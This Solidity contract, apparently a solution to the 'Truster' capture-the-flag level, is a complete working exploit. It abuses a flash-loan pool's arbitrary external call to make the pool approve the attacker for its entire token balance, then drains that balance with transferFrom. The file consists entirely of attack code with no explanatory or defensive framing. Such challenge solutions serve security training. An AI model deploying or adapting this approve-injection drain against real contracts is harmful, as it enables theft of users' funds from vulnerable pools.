// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttack {

    function attack(address pool, address token) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), IERC20(token).balanceOf(pool));
        (bool success, ) = pool.call(abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)", 0, tx.origin, token, data));
        require(success,"Attack was not succeeded");

        IERC20(token).transferFrom(pool, tx.origin, IERC20(token).balanceOf(pool));
    }

    receive() external payable{}
}